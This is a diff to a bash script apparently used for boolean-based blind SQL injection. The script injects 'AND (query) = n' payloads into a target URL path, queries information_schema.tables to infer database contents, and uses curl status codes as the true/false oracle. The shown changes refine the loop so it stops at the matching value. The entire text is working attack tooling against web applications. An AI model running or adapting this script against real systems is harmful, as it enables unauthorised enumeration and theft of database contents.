@@ -42,13 +42,15 @@ function getAmount() {
 
 	tableName='information_schema.tables'
 	condition="table_schema = ${database}"
-	#sqli=(SELECT COUNT(*) FROM ${tableName} WHERE ${condition}) > 0
 
 	for index in {1..6}; do
-		sqli="AND (${sqlQuery}) > $index"
-		echo "$sqli"
+		sqli="AND (${sqlQuery}) = $index"
 		request "$sqli"
-		echo $?
+		result=$(echo $?)
+		if [ $result -eq 0 ]; then
+			echo $index
+			break
+		fi
 	done
 }
 
@@ -74,10 +76,11 @@ function request() {
 	# rquired
 	# - parsed url
 	# take care of parsing url!
+	SPACE="%20"
 	encodedUrl=$(encodeToUrl "$1")
-	echo "$encodedUrl"
-	echo "$URL/${PATH}%20${encodedUrl}"
-	/usr/bin/curl --silent -i "$URL/${PATH}%20${encodedUrl}" | /usr/bin/head -n 1 | /usr/bin/grep -q '200'
+	#echo "$encodedUrl"
+	#echo "$URL/${PATH}%20${encodedUrl}"
+	/usr/bin/curl --silent -i "$URL/${PATH}${SPACE}${encodedUrl}" | /usr/bin/head -n 1 | /usr/bin/grep -q '200'
 	#/usr/bin/curl --silent -i $URL/"${PATH}%20${encodedUrl}" | /usr/bin/head -n 1
 }
 
